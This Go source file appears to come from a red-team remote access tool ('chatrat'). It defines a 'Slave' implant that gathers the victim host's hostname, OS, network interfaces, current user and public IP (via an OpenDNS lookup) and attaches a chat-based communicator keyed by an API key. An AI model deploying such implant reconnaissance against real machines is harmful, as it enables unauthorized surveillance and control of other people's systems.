package slave

import (
	"context"
	"net"
	"os"
	"os/user"
	"runtime"
	"time"

	"github.com/CoveoSec/chatrat/pkg/listeners"
	"github.com/lithammer/shortuuid/v4"
)

type NetworkInterface struct {
	Name   string
	IPAddr []string
	MAC    string
}

type Slave struct {
	Hostname          string
	OS                string
	NetworkInterfaces []*NetworkInterface
	PublicIP          string
	CurrentUser       *user.User
	Communicator      listeners.Communicator
}

func getHostname() string {
	hostname, err := os.Hostname()
	if err != nil {
		return "unkown"
	}
	return hostname
}

func getOS() string {
	return runtime.GOOS
}

func getNetworkInterfaces() []*NetworkInterface {
	nIfaceList := []*NetworkInterface{}
	interfaces, err := net.Interfaces()
	if err != nil {
		return []*NetworkInterface{}
	}

	for _, iface := range interfaces {
		currentNetworkInterface := new(NetworkInterface)
		currentNetworkInterface.Name = iface.Name
		currentNetworkInterface.MAC = iface.HardwareAddr.String()

		if addrs, err := iface.Addrs(); err == nil {
			for _, addr := range addrs {
				currentNetworkInterface.IPAddr = append(currentNetworkInterface.IPAddr, addr.String())
			}
		}

		nIfaceList = append(nIfaceList, currentNetworkInterface)

	}
	return nIfaceList
}

func getPublicIP() string {
	resolver := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{
				Timeout: time.Millisecond * time.Duration(10000),
			}
			return d.DialContext(ctx, network, "resolver1.opendns.com:53")
		},
	}

	ip, err := resolver.LookupHost(context.Background(), "myip.opendns.com")
	if err != nil {
		return "unknown"
	}
	return ip[0]

}

func getCurrentUser() *user.User {
	if username, err := user.Current(); err == nil {
		return username
	}
	return &user.User{
		Name:     "Unknown",
		Uid:      "Unknown",
		Gid:      "Unknown",
		Username: "Unknown",
		HomeDir:  "Unknown",
	}

}

func NewSlave(apiKey string, commType listeners.CommType) *Slave {

	id := shortuuid.New()

	return &Slave{
		Hostname:          getHostname(),
		OS:                getOS(),
		NetworkInterfaces: getNetworkInterfaces(),
		PublicIP:          getPublicIP(),
		CurrentUser:       getCurrentUser(),
		Communicator:      listeners.NewCommunicator(apiKey, id, commType),
	}
}
